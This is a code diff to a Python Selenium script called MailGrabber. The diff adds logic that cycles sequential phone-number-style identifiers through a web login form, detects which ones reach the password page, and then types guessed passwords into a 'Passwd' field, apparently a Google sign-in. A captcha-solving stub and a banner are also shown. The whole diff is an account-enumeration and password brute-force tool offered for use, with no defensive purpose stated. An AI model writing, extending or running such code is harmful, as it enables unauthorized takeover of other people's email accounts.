@@ -27,8 +27,10 @@ class MailGrabber(webdriver.Chrome):
             return None
 
     def show_intro(self):
-        print("WELCOME TO MAIL GRABBER")
-        print("")
+        text = "WELCOME TO MAILGRABBER"
+        headline = text.upper().center(80, '#')
+        headline = f"\033[38;5;208m\033[1m\033[120m{headline}\033[0m"
+        print(headline)
 
     def solve_captcha(self):
         pass
@@ -56,16 +58,14 @@ class MailGrabber(webdriver.Chrome):
             i += 1
             number = int(number) + 1
             arr.append(number)
-            print(arr)
-
-        for y in range(0, length_of_password):
-            pass_arr.append(arr)
-        print("Choosen passwords=>" + str(pass_arr))
+            pass_arr.append(str(number)[:length_of_password])
+            print("Choosen Numbers for trying to grab Email => " + str(arr))
+            print("Choosen Passwords => " + str(pass_arr))
 
         while k <= amount:
             k += 1
             for j in arr:
-                email.send_keys(j)
+                email.send_keys("0" + str(j))
                 submit_email.click()
                 print("Tried => " + str(j))
                 if self.current_url == password_url:
@@ -73,7 +73,12 @@ class MailGrabber(webdriver.Chrome):
                     success_email.append(j)
                     print("Success Email" + str(j))
                     # pass password from here
-                    pass
+                    for z in pass_arr:
+                        password = wait.until(EC.element_to_be_clickable((
+                            By.XPATH, "//input[@name='Passwd']"
+                        )))
+                        password.click()
+                        password.send_keys(z)
 
                 time.sleep(5)
                 email.clear()
